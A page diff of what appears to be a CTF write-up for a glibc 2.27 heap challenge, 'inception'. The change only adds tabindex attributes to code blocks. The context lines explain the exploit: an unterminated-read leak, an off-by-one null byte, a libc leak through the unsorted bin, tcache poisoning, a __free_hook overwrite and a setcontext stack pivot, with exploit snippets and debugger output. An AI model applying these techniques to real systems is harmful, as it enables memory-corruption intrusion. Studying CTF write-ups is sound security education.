@@ -97,7 +97,7 @@
 <p>We are given the binary, the libc, as well as the path to the flag, <code>/home/user/flag.txt</code>. The version of the libc is 2.27.</p>
 <p>Playing with the binary, it looks like a typical heap exploitation challenge : we can create <code>dreams</code> of any size lesser than 0x800 bytes, edit <code>dreams</code>, show their content, as well as delete them. Creating and deleting <code>dreams</code> is allocating and freeing chunks respectively.
 Dreams are identified by an index.</p>
-<pre><code class="language-raw" data-lang="raw">-= Dream Book =-
+<pre tabindex="0"><code class="language-raw" data-lang="raw">-= Dream Book =-
 1. Add dream
 2. Delete dream
 3. Edit dream
@@ -155,14 +155,14 @@ Dream deleted.
 Dream index: 0
 Empty dream.
 </code></pre><p>Reviewing the mitigations, everything is enabled (we can safely assume that ASLR is enabled on the remote machine):</p>
-<pre><code class="language-raw" data-lang="raw">$ checksec inception
+<pre tabindex="0"><code class="language-raw" data-lang="raw">$ checksec inception
     Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
 </code></pre><p>By looking at the assembly, can also see that the program uses seccomp. Let&rsquo;s see the rules in details using <a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>.</p>
-<pre><code class="language-raw" data-lang="raw">$ seccomp-tools dump ./inception
+<pre tabindex="0"><code class="language-raw" data-lang="raw">$ seccomp-tools dump ./inception
  line  CODE  JT   JF      K
 =================================
  0000: 0x20 0x00 0x00 0x00000004  A = arch
@@ -185,7 +185,7 @@ Empty dream.
 <p>Firstly, when adding a <code>dream</code>, the content of the dream is read using the <code>read</code> function, which does not append a null byte to the string, and no null bytes are added to ensure that the strings is terminated.
 Thus, since the view functionnality prints a strings, it is possible to read any bytes following the content of a <code>dream</code> up until the first null byte encountered.</p>
 <p>The second vulnerability is in the edit functionality, when trying to add a null byte at the end of the string, as highlighted here :</p>
-<pre><code class="language-x86asm" data-lang="x86asm">mov eax, dword [rbp - 8]    ; eax contains the index of the dream
+<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">mov eax, dword [rbp - 8]    ; eax contains the index of the dream
 cdqe
 lea rdx, [rax*4]
 lea rax, obj.dreams_size
@@ -221,7 +221,7 @@ However, if we created a <code>dream</code> whose size was filling the content o
 <h4 id="leaking-the-heap">Leaking the heap</h4>
 <p>We will need the base address of the heap for the last part of our exploitation, but it is easier to get it now. For this, we will use the first vulnerability, leveraging <code>tcache</code> bins. A more complete overview of the different aspects of <code>malloc</code> can be found on MallocInternals <a href="https://sourceware.org/glibc/wiki/MallocInternals">here</a>, but essentialy, <code>malloc</code> keeps track of freed chunks, and categorizes them differents bins - <code>tcache</code> being one of them. It contains several singly linked LIFO lists, each containning freed chunk, each list having a specific chunk size.</p>
 <p>An example of freed <code>dreams</code> in a tcache bin :</p>
-<pre><code class="language-raw" data-lang="raw">0x55555555a250: 0x0000000000000000      0x0000000000000021 &lt;- metadata of chunk 1
+<pre tabindex="0"><code class="language-raw" data-lang="raw">0x55555555a250: 0x0000000000000000      0x0000000000000021 &lt;- metadata of chunk 1
 0x55555555a260: 0x0000000000000000      0x000055555555a010 &lt;- data of freed chunk 1
 0x55555555a270: 0x0000000000000000      0x0000000000000021 &lt;- metadata of chunk 2
 0x55555555a280: 0x000055555555a260      0x000055555555a010 &lt;- data of freed chunk 2
@@ -263,7 +263,7 @@ add(0x200, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;
 
 delete(0)
 </code></pre></div><p>We have the following situation :</p>
-<pre><code class="language-raw" data-lang="raw">gef➤  heap chunks
+<pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  heap chunks
 ...
 Chunk(addr=0x55939522b260, size=0x500, flags=PREV_INUSE)
     [0x000055939522b260     a0 1c 4d 64 62 7f 00 00 a0 1c 4d 64 62 7f 00 00    ..Mdb.....Mdb...]
@@ -273,7 +273,7 @@ Chunk(addr=0x55939522b7d0, size=0x500, flags=PREV_INUSE)
     [0x000055939522b7d0     63 63 63 63 00 00 00 00 00 00 00 00 00 00 00 00    cccc............]
 Chunk(addr=0x55939522bcd0, size=0x210, flags=PREV_INUSE)
     [0x000055939522bcd0     64 64 64 64 00 00 00 00 00 00 00 00 00 00 00 00    dddd............]
-</code></pre><pre><code class="language-raw" data-lang="raw">gef➤  x/2gx 0x000055939522b260
+</code></pre><pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  x/2gx 0x000055939522b260
 0x55939522b260: 0x00007f62644d1ca0      0x00007f62644d1ca0
 </code></pre><p>We have four chunk, the first one being free, while the other 3 are in use. We can see two libc address : this is why we chose a size of <code>0x4f0</code> for our dream : it creates a chunk of size <code>0x500</code>, which is too big to go in either the <code>tcache</code> or <code>fastbins</code>, so it ends up in the <code>unsorted bin</code>, which is a doubly linked list, whose head is in the libc, and the freed chunks have a forward and backward pointer to the list, this is why we have this address here. So we actually put a libc address on the heap.</p>
 <p>Next, we will leverage the second vulnerability to clear the least signigicant bit of the <code>cccc</code> chunk, updating the <code>PREV_INUSE</code> flag. This is also why we <code>0x4F0</code> for the dream size, it creates a <code>0x500</code> chunk, and so while clearing this bit, we do not shrink the chunk size. This will make <code>malloc</code> think that the chunk <code>bbbb</code> is free while it actually is not.
@@ -288,7 +288,7 @@ delete(0)
 
 edit(1, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;B&#39;</span>*0x60 + p64(0x570)) <span style="color:#008000"># Set prev_size</span>
 </code></pre></div><p>in our debugger, we get :</p>
-<pre><code class="language-raw" data-lang="raw">gef➤  heap chunks
+<pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  heap chunks
 ...
 Chunk(addr=0x564dbb2f4260, size=0x500, flags=PREV_INUSE)
     [0x0000564dbb2f4260     a0 ac 78 6c d5 7f 00 00 a0 ac 78 6c d5 7f 00 00    ..xl......xl....]
@@ -322,7 +322,7 @@ delete(0)
 edit(1, <span style="color:#a31515">b</span><span style="color:#a31515">&#39;B&#39;</span>*0x60 + p64(0x570)) <span style="color:#008000"># Set prev_size</span>
 delete(2)
 </code></pre></div><p>And the result :</p>
-<pre><code class="language-raw" data-lang="raw">gef➤  heap chunks
+<pre tabindex="0"><code class="language-raw" data-lang="raw">gef➤  heap chunks
 ...
 Chunk(addr=0x55be450242a0, size=0xa70, flags=PREV_INUSE)
     [0x000055be450242a0     a0 0c f6 15 09 7f 00 00 a0 0c f6 15 09 7f 00 00    ................]
@@ -381,7 +381,7 @@ log.success(<span style="color:#a31515">f</span><span style="color:#a31515">&#34
 delete(2)                        <span style="color:#008000"># We immediately free it</span>
 edit(1, p64(0x012345679abcdef))  <span style="color:#008000"># Overwrite the pointer</span>
 </code></pre></div><p>Looking at the <code>tcache</code> we can see we corrupted our list :</p>
-<pre><code>gef➤  heap bins
+<pre tabindex="0"><code>gef➤  heap bins
 ...
 Tcachebins[idx=5, size=0x70] count=1  ←  Chunk(addr=0x564c2d1037a0, size=0x70, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x123456789abcdef]
 </code></pre><p>Allocating a new dream of the same size, we are left with our corrupted chunk, allocating once more, we get a segmentation fault !</p>
@@ -407,7 +407,7 @@ For this to work, we need to be able to execute at least a ropchain, at best a s
 However, the argument to <code>free</code> is a pointer to the chunk we are trying to free, so if we overwrite <code>__free_hook</code> with our gadget, when our gadget is called, we control the values at <code>[rdi + 0x??]</code>. This is enough to do a stack pivot.</p>
 <p>If there was no seccomp, using this same method, we could overwrite <code>__free_hook</code> with the address of <code>system</code>, create a <code>dream</code> with the content <code>/bin/sh\x00</code>, and free it to get a shell.</p>
 <p>Where do we find this gadget ? In the libc ! (We don&rsquo;t even know the base address of the binary). There are <em>many</em> gadgets in a libc, so finding exactly what we want can take some time. There is a well-known gadget in the <code>setcontext</code> function in this version of the libc.</p>
-<pre><code class="language-x86asm" data-lang="x86asm">0x000521b5      488ba7a00000.  mov rsp, qword [rdi + 0xa0]
+<pre tabindex="0"><code class="language-x86asm" data-lang="x86asm">0x000521b5      488ba7a00000.  mov rsp, qword [rdi + 0xa0]
 0x000521bc      488b9f800000.  mov rbx, qword [rdi + 0x80]
 0x000521c3      488b6f78       mov rbp, qword [rdi + 0x78]
 0x000521c7      4c8b6748       mov r12, qword [rdi + 0x48]
